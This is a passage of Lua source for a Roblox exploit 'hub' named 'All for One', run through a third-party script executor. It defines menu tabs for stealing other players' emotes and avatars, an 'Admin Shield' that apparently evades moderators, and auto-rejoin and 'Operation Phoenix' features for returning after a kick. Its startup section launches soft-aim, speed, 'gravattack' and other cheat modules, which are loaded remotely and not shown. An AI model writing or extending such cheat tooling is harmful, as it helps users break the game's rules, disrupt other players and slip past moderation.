--  SECCIÓN 12: TAB "MISC"
-- ═══════════════════════════════════════════════════════════════════════════

local Misc = Window:AddTab({ Title = T.tab_misc or "Misc", Icon = "music" })

local _stealEmoteModule = nil
local stealEmoteEnabled = false
local function stealEmoteStop(preserveEnabled)
    if not preserveEnabled then stealEmoteEnabled = false end
    if _stealEmoteModule and type(_stealEmoteModule) == "table" and _stealEmoteModule.Stop then pcall(function() _stealEmoteModule.Stop(preserveEnabled) end) end
end
local function stealEmoteStart()
    if not _stealEmoteModule then _stealEmoteModule = loadModule("StealEmote") end
    if _stealEmoteModule and type(_stealEmoteModule) == "table" and _stealEmoteModule.Start then pcall(function() _stealEmoteModule.Start(Keys, lplr, CoreGui, RunService, TweenService, camera) end) end
end
local function restartStealEmoteIfRunning()
    if not stealEmoteEnabled then return end
    stealEmoteStop(true); stealEmoteEnabled = true; stealEmoteStart()
end

Misc:AddToggle("StealEmoteToggle", {
    Title = T.lbl_misc_emote or "Steal Emote",
    Default = false,
    Callback = function(value)
        stealEmoteEnabled = value
        if value then stealEmoteStart() else stealEmoteStop() end
        notify(T.notif_misc_emote_title or "Steal Emote", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})
Misc:AddKeybind("StealEmoteStealKeybind", {
    Title = T.lbl_misc_steal_key or "Steal Key", Default = "T",
    Callback = function(key)
        applyKey("EmoteSteal", key, Enum.KeyCode.T); restartStealEmoteIfRunning()
    end,
    ChangedCallback = function(key) applyKey("EmoteSteal", key, Enum.KeyCode.T); restartStealEmoteIfRunning() end
})
Misc:AddKeybind("StealEmoteExecuteKeybind", {
    Title = T.lbl_misc_execute_key or "Execute Key", Default = "Y",
    Callback = function(key)
        applyKey("EmoteExecute", key, Enum.KeyCode.Y); restartStealEmoteIfRunning()
    end,
    ChangedCallback = function(key) applyKey("EmoteExecute", key, Enum.KeyCode.Y); restartStealEmoteIfRunning() end
})
Misc:AddKeybind("StealEmoteExpandKeybind", {
    Title = T.lbl_misc_expand_key or "Expand Key", Default = "U",
    Callback = function(key)
        applyKey("EmoteExpand", key, Enum.KeyCode.U); restartStealEmoteIfRunning()
    end,
    ChangedCallback = function(key) applyKey("EmoteExpand", key, Enum.KeyCode.U); restartStealEmoteIfRunning() end
})

local _copyAvatarModule = nil
local copyAvatarStarted = false

local function copyAvatarStart(forceExecute)
    if not _copyAvatarModule then _copyAvatarModule = loadModule("CopyAvatar") end
    if type(_copyAvatarModule) == "table" then
        if forceExecute and type(_copyAvatarModule.Execute) == "function" then
            pcall(function() _copyAvatarModule.Execute() end)
            notify(T.notif_copyavatar_title or "Copy Avatar", T.notif_avatar_copied or "Avatar successfully copied.", 4)
        elseif type(_copyAvatarModule.Start) == "function" then
            if forceExecute or not copyAvatarStarted then
                local ok, startErr = pcall(function() _copyAvatarModule.Start(Keys, lplr, EXECUTOR_DEFAULT_AVATAR) end)
                if ok then
                    copyAvatarStarted = true
                else
                    warn("[AllForOne] CopyAvatar.Start fallo: " .. tostring(startErr))
                end
            end
        end
        return true
    end
    if type(_copyAvatarModule) == "function" then
        pcall(function() _copyAvatarModule(Keys, lplr, EXECUTOR_DEFAULT_AVATAR) end)
        return true
    end
    return false
end
local function copyAvatarStop()
    if _copyAvatarModule and type(_copyAvatarModule) == "table" and type(_copyAvatarModule.Stop) == "function" then
        pcall(function() _copyAvatarModule.Stop(true) end)
    end
    copyAvatarStarted = false
end
Misc:AddButton({
    Title = T.lbl_copyavatar or "Copy Avatar",
    Callback = function() copyAvatarStart(true) end
})
Misc:AddKeybind("CopyAvatarKeybind", {
    Title = T.lbl_copyavatar_key or "Copy Avatar Key",
    Default = "F4",
    Callback = function(key)
        applyKey("CopyAvatar", key, Enum.KeyCode.F4)
        if _copyAvatarModule and _copyAvatarModule.SetKey then pcall(function() _copyAvatarModule.SetKey(Keys.CopyAvatar) end) end
    end,
    ChangedCallback = function(key)
        applyKey("CopyAvatar", key, Enum.KeyCode.F4)
        if _copyAvatarModule and _copyAvatarModule.SetKey then pcall(function() _copyAvatarModule.SetKey(Keys.CopyAvatar) end) end
    end
})

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 13: TAB "DEFENSA"
-- ═══════════════════════════════════════════════════════════════════════════

local Defend = Window:AddTab({ Title = T.tab_defend or "Defend", Icon = "shield" })

local _antiFlingModule = nil
local antiFlingModuleStarted = false
local function antiFlingStart()
    if not _antiFlingModule then _antiFlingModule = loadModule("AntiFling") end
    if _antiFlingModule and type(_antiFlingModule) == "table" then
        if not antiFlingModuleStarted and _antiFlingModule.Start then
            pcall(function() _antiFlingModule.Start(lplr) end)
            antiFlingModuleStarted = true
        end
        if _antiFlingModule.Toggle then pcall(function() _antiFlingModule.Toggle(true) end) end
    end
end
local function antiFlingStop()
    if _antiFlingModule and type(_antiFlingModule) == "table" and _antiFlingModule.Toggle then pcall(function() _antiFlingModule.Toggle(false) end) end
end
Defend:AddToggle("AntiFlingToggle", {
    Title = T.lbl_antifling or "Anti Fling",
    Default = true,
    Callback = function(value)
        antiFlingEnabled = value
        if value then antiFlingStart() else antiFlingStop() end
        notify(T.notif_antifling_title or "Anti Fling", value and (T.notif_on or "ON") or (T.notif_off or "OFF"))
    end
})

local _adminShieldModule = nil
local function adminShieldStart()
    if not _adminShieldModule then _adminShieldModule = loadModule("AdminShield") end
    if _adminShieldModule and type(_adminShieldModule) == "table" and _adminShieldModule.Start then pcall(function() _adminShieldModule.Start() end) end
end
local function adminShieldStop()
    if _adminShieldModule and type(_adminShieldModule) == "table" and _adminShieldModule.Stop then pcall(function() _adminShieldModule.Stop() end) end
end
Defend:AddToggle("AdminShieldToggle", {
    Title = T.lbl_adminshield or "Admin Shield",
    Default = true,
    Callback = function(value)
        adminShieldEnabled = value
        if value then
            if not _adminShieldModule then adminShieldStart() end
            notify(T.notif_adminshield_on_title or "Admin Shield active", T.notif_adminshield_on_content or "Enabled", 4)
        else
            notify(T.notif_adminshield_off_title or "Admin Shield disabled", T.notif_adminshield_off_content or "Disabled", 4)
        end
        if _adminShieldModule and type(_adminShieldModule) == "table" and _adminShieldModule.SetShieldEnabled then
            pcall(function() _adminShieldModule.SetShieldEnabled(value) end)
        end
    end
})

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 14: TAB "SERVIDOR"
-- ═══════════════════════════════════════════════════════════════════════════

local Server = Window:AddTab({ Title = T.tab_server or "Server", Icon = "server" })

Server:AddButton({
    Title = T.btn_rejoin or "Rejoin",
    Callback = function()
        notify(T.notif_rejoin_title or "Rejoining...", T.notif_rejoin_content or "Joining back to the same server.", 4)
        task.wait(0.5); QueueSelf(); task.wait(0.4)
        if #Players:GetPlayers() <= 1 then pcall(function() TeleportService:Teleport(placeId, lplr) end)
        else pcall(function() TeleportService:TeleportToPlaceInstance(placeId, jobId, lplr) end) end
    end
})

Server:AddButton({
    Title = T.btn_smallserver or "Small Server",
    Callback = function()
        notify(T.notif_smallserver_title or "Finding server...", T.notif_smallserver_content or "Joining the smallest available server.", 4)
        task.spawn(function()
            local serversURL = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
            local function fetch(cursor)
                local ok, result = pcall(function()
                    local raw = game:HttpGet(serversURL..((cursor and "&cursor="..cursor) or ""))
                    return HttpService:JSONDecode(raw)
                end)
                if ok then return result end
                return nil
            end
            local data, nextCursor
            local attempts = 0
            repeat
                data = fetch(nextCursor)
                nextCursor = data and data.nextPageCursor
                attempts += 1
                if not (data and data.data and #data.data > 0) and attempts < 15 then
                    task.wait(0.5)
                end
            until (data and data.data and #data.data > 0) or attempts >= 15 or not nextCursor
            local server = data and data.data and data.data[1]
            if server then
                QueueSelf(); task.wait(0.3)
                TeleportService:TeleportToPlaceInstance(placeId, server.id, lplr)
            else
                notify(T.btn_smallserver or "Small Server", T.notif_smallserver_content or "No se encontró servidor.", 4)
            end
        end)
    end
})

-- Auto Rejoin: módulo aparte. Si te kickean, intenta volver solo al mismo servidor.
local rejoinLang = savedLang

local _autoRejoinModule = nil
local function autoRejoinStart()
    if not _autoRejoinModule then _autoRejoinModule = loadModule("AutoRejoin") end
    local m = _autoRejoinModule
    if type(m) ~= "table" then return end
    if m.Start and not (m.IsRunning and m.IsRunning()) then pcall(m.Start, rejoinLang) end
end
local function autoRejoinStop()
    local m = _autoRejoinModule
    if type(m) == "table" and m.Stop then pcall(m.Stop) end
end

-- Operation Phoenix: menú manual (tecla configurable) para volver a un servidor pegando su JobId.
-- Si te kickean copia el JobId del servidor al portapapeles.
local _phoenixModule = nil
local function phoenixStart()
    if not _phoenixModule then _phoenixModule = loadModule("Phoenix") end
    local m = _phoenixModule
    if type(m) ~= "table" then return end
    if m.Start and not (m.IsRunning and m.IsRunning()) then
        pcall(m.Start, rejoinLang, { Menu = Keys.PhoenixMenu })
    end
end
local function phoenixStop()
    local m = _phoenixModule
    if type(m) == "table" and m.Stop then pcall(m.Stop) end
end
local function phoenixApplyKey()
    local m = _phoenixModule
    if type(m) == "table" and m.SetKey then pcall(m.SetKey, Keys.PhoenixMenu) end
end

-- El idioma lo comparten los dos módulos
local function rejoinSetLanguage(code)
    rejoinLang = code
    local a, p = _autoRejoinModule, _phoenixModule
    if type(a) == "table" and a.SetLanguage then pcall(a.SetLanguage, code) end
    if type(p) == "table" and p.SetLanguage then pcall(p.SetLanguage, code) end
end

Server:AddToggle("AutoRejoinToggle", {
    Title = T.lbl_autorejoin or "Auto Rejoin",
    Default = true,
    Callback = function(value)
        autoRejoinEnabled = value
        if value then
            autoRejoinStart()
            notify(T.notif_autorejoin_on_title or "Auto Rejoin enabled", T.notif_autorejoin_on_content or "Enabled", 4)
        else
            autoRejoinStop()
            notify(T.notif_autorejoin_off_title or "Auto Rejoin disabled", T.notif_autorejoin_off_content or "Disabled", 4)
        end
    end
})

Server:AddToggle("OperationPhoenixToggle", {
    Title = T.lbl_phoenix or "Operation Phoenix",
    Default = true,
    Callback = function(value)
        phoenixEnabled = value
        if value then
            phoenixStart()
            notify(T.notif_phoenix_on_title or "Operation Phoenix enabled", T.notif_phoenix_on_content or "Enabled", 4)
        else
            phoenixStop()
            notify(T.notif_phoenix_off_title or "Operation Phoenix disabled", T.notif_phoenix_off_content or "Disabled", 4)
        end
    end
})
Server:AddKeybind("PhoenixMenuKeybind", {
    Title = T.lbl_phoenix_key or "Operation Phoenix Key",
    Default = "F7",
    Callback = function(key)
        applyKey("PhoenixMenu", key, Enum.KeyCode.F7)
        phoenixApplyKey()
    end,
    ChangedCallback = function(key)
        applyKey("PhoenixMenu", key, Enum.KeyCode.F7)
        phoenixApplyKey()
    end
})

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 15: TAB "AJUSTES"
-- ═══════════════════════════════════════════════════════════════════════════

local Settings = Window:AddTab({ Title = T.tab_settings or "Settings", Icon = "settings" })

Settings:AddDropdown("LanguageDropdown", {
    Title = T.lbl_language or "Language",
    Values = {"Español", "English"},
    Default = savedLang == "EN" and "English" or "Español",
    Callback = function(value)
        local code = value == "English" and "EN" or "ES"
        pcall(function()
            if not isfolder("AllForOne") then makefolder("AllForOne") end
            writefile("AllForOne/lang.txt", code)
            writefile("AllForOne/last_tab.txt", "settings")
        end)
        rejoinSetLanguage(code)
        notify(T.notif_lang_changed or "Language changed", T.notif_lang_changed_content or "Changed", 4)
    end
})

Settings:AddKeybind("MinimizeKeybind", {
    Title = T.lbl_keybind or "Minimize Key",
    Default = "F3",
    Callback = function(key)
        pcall(function() Window:SetMinimizeKey(parseKeyCode(key, Enum.KeyCode.F3)) end)
    end,
    ChangedCallback = function(key)
        pcall(function() Window:SetMinimizeKey(parseKeyCode(key, Enum.KeyCode.F3)) end)
    end
})

Settings:AddButton({
    Title = T.btn_close or "Close",
    Callback = function()
        muiStop()
        omniStop()
        unpredicStop()
        softAimStop()
        stealEmoteStop()
        tpStop()
        phoenixStop()
        autoRejoinStop()
        adminShieldStop()
        noCDDashStop()
        pbStop()
        antiFlingStop()
        copyAvatarStop()
        if _speedForceModule and type(_speedForceModule) == "table" and _speedForceModule.Stop then pcall(function() _speedForceModule.Stop() end) end
        if gravattackModule and type(gravattackModule) == "table" and gravattackModule.Stop then gravattackModule.Stop() end
        if lockModule and type(lockModule) == "table" and lockModule.Stop then lockModule.Stop() end
        disconnectAllConnections()
        pcall(function() Window:Destroy() end)
        getgenv()._AFO_HUB_LOADED = nil
        notify("Hub", T.notif_hub_deleted or "Hub successfully deleted.", 4)
    end
})

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 16: TAB "CONFIG"
-- ═══════════════════════════════════════════════════════════════════════════

local Config = Window:AddTab({ Title = T.tab_config or "Config", Icon = "clipboard" })

-- La carpeta de configuraciones es una sola y unica en todo el hub (antes se
-- pisaba con dos valores distintos: "AllForOne/Config" y "AllForOne/Configs").
local CONFIG_FOLDER      = "AllForOne/Configs"
local CONFIG_AUTOLOAD_FILE = CONFIG_FOLDER .. "/settings/autoload.txt"

if SaveManager then
    SaveManager:SetLibrary(Fluent)
    SaveManager:IgnoreThemeSettings()
    SaveManager:SetIgnoreIndexes({"LanguageDropdown"})
    SaveManager:SetFolder(CONFIG_FOLDER)

    -- SaveManager:Save(name) / :Load(name) EXIGEN un nombre: sin el devuelven
    -- "no config selected" y no escriben ni leen nada. El codigo anterior los
    -- llamaba sin argumentos (SaveManager:Save() / SaveManager:Load()), asi que
    -- los botones nunca guardaban ni cargaban nada, pero igual mostraban el
    -- aviso de "guardado/cargado con éxito". Ademas llamaba a
    -- SaveManager:SetAutoloadConfig(...), un método que no existe en esta
    -- librería (habría lanzado un error la primera vez que se usara el campo).
    local configNameInput
    configNameInput = Config:AddInput("ConfigName", {
        Title = T.lbl_autoload or "AutoLoad Config",
        Default = "default",
        Placeholder = "config name",
    })

    local function currentConfigName()
        local name = configNameInput and configNameInput.Value
        if type(name) ~= "string" or name:gsub(" ", "") == "" then return nil end
        return name
    end

    Config:AddButton({ Title = T.lbl_saveconfig or "Save Config", Callback = function()
        local name = currentConfigName()
        if not name then
            notify("Config", T.lbl_autoload or "AutoLoad Config", 4)
            return
        end
        local ok, errMsg = SaveManager:Save(name)
        if ok then
            notify("Config", T.notif_config_saved or "Config successfully saved.", 4)
        else
            warn("[AllForOne] SaveManager:Save fallo: " .. tostring(errMsg))
        end
    end })

    Config:AddButton({ Title = T.lbl_loadconfig or "Load Config", Callback = function()
        local name = currentConfigName()
        if not name then
            notify("Config", T.lbl_autoload or "AutoLoad Config", 4)
            return
        end
        local ok, errMsg = SaveManager:Load(name)
        if ok then
            notify("Config", T.notif_config_loaded or "Config successfully loaded.", 4)
        else
            warn("[AllForOne] SaveManager:Load fallo: " .. tostring(errMsg))
        end
    end })

    -- "Auto Config": guarda el nombre tecleado como el que se carga solo al
    -- abrir el hub (mismo archivo que usa SaveManager:LoadAutoloadConfig()).
    Config:AddToggle("AutoloadToggle", {
        Title = T.lbl_autoload or "AutoLoad Config",
        Default = false,
        Callback = function(value)
            pcall(function()
                if value then
                    local name = currentConfigName()
                    if not name then return end
                    if not isfolder(CONFIG_FOLDER .. "/settings") then makefolder(CONFIG_FOLDER .. "/settings") end
                    writefile(CONFIG_AUTOLOAD_FILE, name)
                else
                    if isfile(CONFIG_AUTOLOAD_FILE) then delfile(CONFIG_AUTOLOAD_FILE) end
                end
            end)
        end
    })

    SaveManager:LoadAutoloadConfig()
end

-- ═══════════════════════════════════════════════════════════════════════════
--  SECCIÓN 17: INICIALIZACIÓN FINAL Y CARGAS ASINCRONAS
-- ═══════════════════════════════════════════════════════════════════════════

Window:SelectTab(startOnSettings and 5 or 1)

if teleportEnabled then tpStart() end
if passiveBangEnabled then pbStart() end
if muiEnabled then muiStart() end
if omniBlockEnabled then omniStart() end
if softAimEnabled then softAimSetup() end
if adminShieldEnabled then adminShieldStart() end
if phoenixEnabled then phoenixStart() end
if autoRejoinEnabled then autoRejoinStart() end
noCDDashStart()
if antiFlingEnabled then antiFlingStart() end
speedForceStart()

if lockEnabled then
    initializeLock()
    if lockModule and lockModule.Start then
        lockModule.Start(lplr, Keys.Lock)
    end
end

trackConnection(lplr.CharacterAdded:Connect(function(char)
    if teleportEnabled then tpStart() else tpStop() end
    if softAimEnabled then softAimSetup() end
    if unpredicEnabled then unpredicStop(); task.wait(0.3); unpredicStart(char) end
end))

task.spawn(function()
    task.wait(1)
    copyAvatarStart(false)
end)

task.spawn(function()
    if not getgenv()._AFO_IS_REJOIN then
        local totalAnimTime = 11.9
        local elapsed = tick() - BOOT_START_TIME
        if elapsed < totalAnimTime then
            task.wait(totalAnimTime - elapsed)
        end
    end

    local function isGrounded()
        local char = lplr.Character
        if not char then return false end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return false end
        
        local rayOrigin = hrp.Position
        local rayDirection = Vector3.new(0, -4, 0)
        local params = RaycastParams.new()
        params.FilterDescendantsInstances = {char}
        params.FilterType = Enum.RaycastFilterType.Exclude
        
        return workspace:Raycast(rayOrigin, rayDirection, params) ~= nil
    end

    while not isGrounded() do
        task.wait(0.1)
    end

    initializing = false
    
    pcall(function()
        Fluent:Notify({ Title = T.notif_activated_title or "All for One", Content = T.notif_activated_content or "Quirk 🟢", Duration = 5 })
    end)
end)
